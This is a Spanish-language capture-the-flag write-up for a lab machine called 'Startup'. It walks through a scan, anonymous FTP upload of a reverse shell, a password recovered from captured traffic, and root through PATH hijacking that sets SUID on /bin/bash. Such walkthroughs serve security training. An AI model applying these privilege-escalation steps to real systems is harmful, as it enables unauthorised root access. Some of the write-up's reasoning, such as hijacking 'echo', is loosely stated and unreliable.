# Startup

## Initial Scan
```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Oct 02 18:43 ftp [NSE: writeable]
| -rw-r--r--    1 1000     1000        49685 Sep 22 12:37 important.jpg
|_-rw-r--r--    1 0        0             208 Oct 02 18:43 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.11.4.77
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e8:7c:ee:58:b5:d3:44:7c:fd:86:95:20:16:d0:f9:8a (RSA)
|   256 d3:d1:f5:65:e4:5d:98:6a:08:5b:10:6d:6f:e2:29:2f (ECDSA)
|_  256 23:11:b7:d5:2b:77:51:54:12:d7:1c:9d:46:5a:4f:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance

```
## Enum
### FTP
Tenemos login anonymous y podemos ver varios archivos en el FTP, tambien podemos ver que dentro de la carpeta del ftp podemos subir archivos 
### Notice.txt
```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```
### HTTP
```
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/files (Status: 301)
/server-status (Status: 403)
```
En el /files vemos el mismo notice.txt del ftp y la misma carpeta /ftp , tal vez podamos subir una reverse shell
## Exploit
Nos logeamos al servidor ftp y subimos una reverse shell en la carpeta ftp, abrimos un listener en local con netcat y accedemos desde el navegador
## Privesc
Tenemos shell como www-data intentemos movernos a un usuario de verdad 
```
root:x:0:0:root:/root:/bin/bash
lennie:x:1002:1002::/home/lennie:
ftpsecure:x:1003:1003::/home/ftpsecure:
```
### Lennie
Podemos acceder a una carpeta llamada incidents con un pcap

Abrimos un python HTTP Server en la maquina objetivo y descargamos el file desde nuestra maquina, analizando las trazas vemos trafico de una reverse shell
```
www-data@startup:/home$ sudo -l
sudo -l
[sudo] password for www-data: c4ntg3t3n0ughsp1c3
Podemos acceder al user lennie usando esa password
```
### Root
Dentro de la carpeta de lenie podemos ver este script
```
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```
echo no se usa con su ruta absoluta lo que nos permite secuestrar el path para escalar privilegios.

Para ello vamos a /tmp y creamos un archivo llamado echo con el siguiente contenido
```
#!/bin/bash
chmod +s /bin/bash
```
Añadimos /tmp al path o nos sitruamos en /tmp, tras esto ejecutamso el planner.sh y habremos modificado los permisos de /bin/bash añadiendo un SUID como root
```
/bin/bash -p
```
Y ya somos root
